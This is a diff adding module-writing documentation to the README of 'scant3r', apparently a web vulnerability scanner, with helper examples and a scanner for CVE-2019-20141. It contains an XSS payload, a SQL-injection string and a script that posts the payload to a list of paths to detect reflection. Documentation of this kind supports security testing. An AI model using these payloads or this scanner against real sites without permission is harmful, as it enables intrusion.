@@ -329,3 +329,179 @@ us.en.kb.sony.com 160.33.196.15
 
 ![IBM](images/ibm.png)
 
+
+
+### writing your scant3r module
+
+#### all functions
+
+| function              | Description                   |
+| :-------------    | :-------------                |
+| NewRequest | http request module |
+| post_data | add modules value to dictionary (for cookies,post/put parameters)|
+| urlencoder | url encoding|
+| ShowMessage | print output of scanner/modules|
+| extractHeaders | add headers value to dictionary|
+| insertAfter | Insert some string into given string at given index 
+
+#### post_data
+```python
+>> from libs import post_data
+>> post_data('id=1&user=admin')
+
+{
+   'id':'1',
+  'user':'admin'
+}
+```
+
+#### NewRequest
+```python
+>> from libs import NewRequest as nq
+>> from libs import post_data
+
+
+# nq.Get(URL)
+#-------------
+# nq.Post(URL,PARAMETERS)
+# nq.Put(URL,PARAMETERS)
+
+>> nq.Get('http://testphp.vulnweb.com/search.php?test=query')
+>> nq.Post('http://testphp.vulnweb.com/search.php',{'test':'query'})
+>> nq.Put('http://testphp.vulnweb.com/search.php',{'test':'query'})
+
+## you can use post_data function with Post and Put
+
+nq.Post('http://testphp.vulnweb.com/search.php',post_data('test=query'))
+nq.Put('http://testphp.vulnweb.com/search.php',post_data('test=query'))
+```
+##### extractHeaders
+```python
+>> from libs import extractHeaders
+>> extractHeaders('Auth: c2NhbnQzcgo=')
+{'Auth': 'c2NhbnQzcgo='}
+```
+##### urlencoder
+```python
+>> from libs import urlencoder
+>> urlencoder('<img src=x onerror=alert(1)>')
+%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
+```
+#### insertAfter
+```python
+>> from libs import insertAfter
+insertAfter('TEXT','INSERT_AFTER','NewText')
+
+>> insertAfter('http://site.com/?msg=hi','=','" OR 1=1 --')
+http://site.com/?msg=" OR 1=1 --hi
+```
+#### ShowMessage
+```python
+>> from core import ShowMessage as show
+>> show.bug(bug='Cross-site scripting',payload='<img src=x onerror=alert(1)>',method='GET',parameter='q',target='http://mysite.com',link='q=<img src=x onerror=alert(1)>')
+
+```
+### example
+
+```python
+
+def run(opts):
+  #opts = all options
+  print(opts)
+# {'proxy': None, 'cookie': None, 'timeout': 10, 'Headers': {}, 'list': None, 'random-agent': False, 'threads': 20, 'module': None, 'url': [], 'host': None}
+  
+```
+### open urls
+```python
+from libs import NeqRequest as nq
+
+
+def run(opts):
+  for url in opts['url']:
+      r = nq.Get(url)
+      # 0 == error
+      if r != 0:
+        print(f'[+] Done :> {url}')
+      
+```
+* add threads
+
+```python
+from libs import NeqRequest as nq
+from threading import Thread
+from queue import Queue
+
+q = Queue()
+def openlink(url):
+  r = nq.Get(url)
+  if r != 0:
+    print(f'[+] Done :> {url}')
+def threader():
+  while True:
+    item = q.get()
+    openlink(item)
+    q.task_done()
+def run(opts):
+  for _ in range(opts['threads']):
+    p1 = Thread(target=threader)
+    p1.daemon = True
+    p1.start()
+  for url in opts['url']:
+    q.put(url)
+  q.join()
+```
+save it in `scant3r/modules/myscript.py`
+
+run 
+```
+$ echo 'http://google.com'|python3 scant3r.py -m myscript
+```
+
+#### scan website from cve-2019-20141
+```python
+#!/usr/bin/env python3
+
+from libs import NewRequest as nq
+from libs import post_data
+from core import ShowMessage as show
+from core import info,bad
+from threading import Thread
+from queue import Queue
+from urllib.parse import urlparse,urljoin
+
+q = Queue()
+
+def add_path(url):
+    paths = [
+            "data/sample-register-form.php",
+            "data/sample-login-form.php",
+            "data/autosuggest-remote.php",
+            "data/sample-forgotpassword-form.php",
+            "data/login-form.php"
+            ]
+    urls = []
+    for path in paths:
+        urls.append(urljoin(url,path))
+    return urls
+def threader():
+    while True:
+        item = q.get()
+        NEON_CVE(item)
+        q.task_done()
+def run(opts):
+    for i in range(opts['threads']):
+        p1 = Thread(target=threader)
+        p1.daemon = True
+        p1.start()
+    for url in opts['url']:
+        q.put(url)
+    q.join()
+def NEON_CVE(url):
+    urls = add_path(url)
+    for u in urls:
+        r = nq.Post(u,post_data('q=<img src=x onerror=alert(1)>'))
+        if '<img src=x onerror=alert(1)>'.encode('utf-8') in r.content:
+            show.bug(bug='Cross-site scripting',payload='<img src=x onerror=alert(1)>',method='GET',parameter='q',target=u,link='q=<img src=x onerror=alert(1)>')
+  
+```
+
